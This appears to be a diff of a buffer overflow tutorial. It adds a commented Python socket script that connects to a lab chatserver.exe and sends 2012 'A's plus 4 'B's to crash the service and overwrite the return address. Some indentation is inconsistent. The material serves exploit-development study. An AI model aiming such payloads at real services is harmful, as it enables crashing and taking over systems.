@@ -311,11 +311,63 @@ message = b"A" * 2012 + b"B" * 4
     # "Try every time to insert 2012 bytes of A's, followed by 4 bytes of B's, until crash!" 
 
 try:
+        
+            # Print message to console:
+        
         print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")
         
-        # I'll use the socket module to create the variable "s"
+            # I'll use the socket module to create the variable "s"
+            # This is a very standard usage of the module socket to get IPv4:PORT = Socket
+            # We will define out RHOST & RPORT (Target/Windows 10 > chatserver.exe)
         
-        s=socket.socket
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(('192.168.1.100',9999))
+        
+            # Once it connects with the RHOST, the script will recieve "intro" Data back from it (The welcome message and that stuff...)
+            # It could work with one line, but for double checking I will try to recieve 2 packages just in case (maybe the "intro" of the program is divided in 2 load screen or something...)
+            
+        s.recv(1024)
+        s.recv(1024)
+
+            # Once it connects with the RHOST, and recieve the "intro" data, the program start to prompt for data.
+            # I will use the Socket Module and variable "s" to send data to the chatserver
+            
+                # 1. First, "chatserver.exe" prompt for a << name >> (no vulverable to buffer overflow)
+                
+                    # send      = "send this"
+                    # username  = "fz3r0"
+                    # '\r\n\'   = \return \new line (like pressing "enter")
+                    # b         = "b" is used before the string to send the string as Bytes and no as String"
+
+        s.send(username + b'\r\n')
+
+            # Recieve data again (I'm sure is only 1 package this time, the prompt for the message)
+            # So, here I recieve the "message prompt" from the server:
+             
+        s.recv(1024)
+                
+                # 2 - Then, "chatserver.exe" prompt for a << message >> (vulverable to buffer overflow!!!)
+                    
+                    # send      = "send this"
+                    # message   = "b"A" * 2012 + b"B" * 4" (++++ tricky payload ++++)
+                    # '\r\n\'   = \return \new line (like pressing "enter")
+                    # b         = "b" is used before the string to send the string as Bytes and no as String"
+
+        s.send(message + b'\r\n')
+       
+            # Recieve data again
+            
+       s.recv(1024)
+       
+            # Close connection with RHOST
+            # End of the loop
+       
+        s.close()
+
+    # Exception script in case some error happen
+
+except:
+        print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Do'nt ask me, I'm just a script!!! >.<")
 ```
 
 
